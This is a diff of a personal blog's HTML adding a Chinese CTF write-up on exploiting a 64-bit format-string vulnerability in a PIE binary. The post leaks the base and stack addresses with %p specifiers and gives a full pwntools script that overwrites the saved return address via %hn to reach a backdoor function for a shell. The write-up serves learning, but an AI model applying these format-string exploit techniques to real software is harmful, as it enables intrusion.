@@ -64,6 +64,66 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-64位格式化字符串之修改返回地址" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" class="article-date">
+  <time datetime="2023-06-03T07:18:11.000Z" itemprop="datePublished">2023-06-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="查看程序的保护"><a href="#查看程序的保护" class="headerlink" title="查看程序的保护"></a>查看程序的保护</h2><p>除了canary之外该有的保护全都有了。<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230603195720.png" alt="Alt text"></p>
+<h2 id="ida查看程序"><a href="#ida查看程序" class="headerlink" title="ida查看程序"></a>ida查看程序</h2><p>可以很明显的发现程序的地址都不对劲，再结合开了pie保护，所以ida里的都不是真实地址而是偏移。<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604105408.png" alt="Alt text"><br>发现后门函数:<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604105626.png" alt="Alt text"></p>
+<h2 id="运行一下程序"><a href="#运行一下程序" class="headerlink" title="运行一下程序"></a>运行一下程序</h2><p>我们可以看到在第一次输入的时候如果我们输入的内容在开头没有按照它的提示选1或者2那么我们就只能输入一次，在开头添上1或2就可以进行第二次输入啦(233特朗普)<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604114113.png" alt="Alt text"><br>我们可以看到格式化字符串参数的偏移为6<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604114445.png" alt="Alt text"></p>
+<h2 id="gdb查看并泄露基地址"><a href="#gdb查看并泄露基地址" class="headerlink" title="gdb查看并泄露基地址"></a>gdb查看并泄露基地址</h2><p>由于开启了pie保护，我们需要查看并泄露基地址。</p>
+<h5 id="查看基地址"><a href="#查看基地址" class="headerlink" title="查看基地址"></a>查看基地址</h5><p><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604105941.png" alt="Alt text"></p>
+<h5 id="泄露基地址"><a href="#泄露基地址" class="headerlink" title="泄露基地址"></a>泄露基地址</h5><p>由于我们已经知道了基地址，所以我们只需要在栈上选取一个和基地址相近的的地址泄露再减去偏移即可，这里我们选取第九个地址。<br>偏移:0x54d5-0x4000 = 0x14d5<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604110219.png" alt="Alt text"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
+<li><p>可以看到，我们可以通过泄露栈上rbp的值，然后通过减去偏移(偏移不变)来获取栈上存放返回地址的地址。</p>
+</li>
+<li><p>而之前可以看到程序里的地址都不是真实地址,而是偏移且只有四位，并且所有地址的基址都是相同的，所以我们修改返回地址只需要修改低四位就可以了。</p>
+</li>
+<li><p>程序的真实地址 = 基址+偏移</p>
+<h4 id="查找rbp"><a href="#查找rbp" class="headerlink" title="查找rbp"></a>查找rbp</h4><p>这里rbp在第14个参数里。而存储返回地址的栈上地址在第15个参数里。<br>他们的偏移:0xd20-0xd18=0x8<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604093459.png" alt="Alt text"></p>
+<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>在第一次输入的时候获得了rbp地址和基地址之后，我们就获得了win函数和返回地址的真实地址了。<br>在第二次输入的时候我们就可以修改存储返回地址的栈地址为win函数的地址就能够获得shell了。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./coronacation&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;1%9$p%14$p%15$p&quot;</span></span><br><span class="line">##泄露基地址和泄露rbp地址，需要在一开始输入<span class="number">1</span>才能进入第二次输入。%<span class="number">15</span>$p是为了方便调试而泄露的返回地址(<span class="number">233</span>)</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;freaking out.&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">base_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x14D5</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">xss_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(base_addr))</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(rbp_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8</span> ##rep相对于返回地址的偏移。</span><br><span class="line">ret_addr = rbp_addr - offset</span><br><span class="line">win_addr = <span class="number">0x1165</span> + base_addr</span><br><span class="line">lose3_addr = <span class="number">0x1380</span> + base_addr</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(win_addr))</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(xss_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;%&quot;</span> + <span class="title function_">str</span>(win_addr&amp;<span class="number">0xffff</span>) + b<span class="string">&quot;c%10$hn&quot;</span></span><br><span class="line">## 存储返回地址的栈上地址的格式化字符串参数偏移我们需要不断调试才能确定</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">0x20</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += <span class="title function_">p64</span>(ret_addr)</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,<span class="string">&quot;b printf&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;healthcare plan.&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="学到了什么？"><a href="#学到了什么？" class="headerlink" title="学到了什么？"></a>学到了什么？</h2><ol>
+<li><p>查看格式化字符串参数偏移的时候，步进相应的printf函数之后马上查看stack才是最准确的，之前都是输入之后马上就查看栈了，所以就在这道题栽了个跟头(呜呜呜)<br>这道题格式化字符串参数的偏移是6，这里第一次输入八个A可以看到刚步进到printf函数之后栈上可以看到格式化字符串参数就是第6个了。<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230603194747.png" alt="Alt text"><br>如果我们在第一次输入之后就马上查看栈上的内容确定格式化字符串参数的偏移的话，就有可能会出错(这这道题就会)<br>很显然，这样的话我们不会直到真正的格式化字符串的偏移是6。<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230603195454.png" alt="Alt text"></p>
+<h4 id="总结-查找格式化字符串参数偏移的时候，要么用上面的方法，要么你就运行程序输入几个A加上多个-p查看。"><a href="#总结-查找格式化字符串参数偏移的时候，要么用上面的方法，要么你就运行程序输入几个A加上多个-p查看。" class="headerlink" title="总结:查找格式化字符串参数偏移的时候，要么用上面的方法，要么你就运行程序输入几个A加上多个%p查看。"></a>总结:查找格式化字符串参数偏移的时候，要么用上面的方法，要么你就运行程序输入几个A加上多个%p查看。</h4></li>
+<li><p>64位程序的函数的前六个参数都会放在寄存器里面，所以在栈上数格式化字符串参数偏移的时候要从第六个开始数。</p>
+</li>
+<li><p>在格式化字符串漏洞修改返回地址的值的具体操作是，修改储存返回地址的栈上的地址的值，而不是直接修改返回地址。<br><img src="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/QQ%E6%88%AA%E5%9B%BE20230604092959.png" alt="Alt text"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" data-id="cligw2vs00003w4v951jfbvm5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-32位格式化字符串之改写fini使程序反复" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" class="article-date">
@@ -106,7 +166,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="clienfzy50003bkv9h196b94z" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="cligw2vs10004w4v9e8h56hp5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -152,7 +212,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="clienfzy50002bkv91ylmeupf" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="cligw2vrz0002w4v96y4x4jaz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -195,7 +255,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="clienfzy40001bkv96ewb8bcs" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="cligw2vru0000w4v91onv7oh5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -245,7 +305,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="clienfzxx0000bkv90j0k6gmn" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="cligw2vry0001w4v952s8845k" class="article-share-link">Share</a>
       
       
     </footer>
@@ -303,7 +363,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="clienfzy70005bkv93uvgaxj7" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="cligw2vs30007w4v91shg74lg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -347,7 +407,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clienfzy60004bkv93xaa92pd" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="cligw2vs20006w4v91n5jbubf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -408,7 +468,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clienfzy70006bkv90aghb28r" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="cligw2vs10005w4v98u0r06ga" class="article-share-link">Share</a>
       
       
     </footer>
@@ -449,6 +509,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
           </li>
         
@@ -462,10 +526,6 @@
         
           <li>
             <a href="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/">32位格式化字符串-任意地址写就行</a>
-          </li>
-        
-          <li>
-            <a href="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/">64位格式化字符串:修改一个值就行</a>
           </li>
         
       </ul>
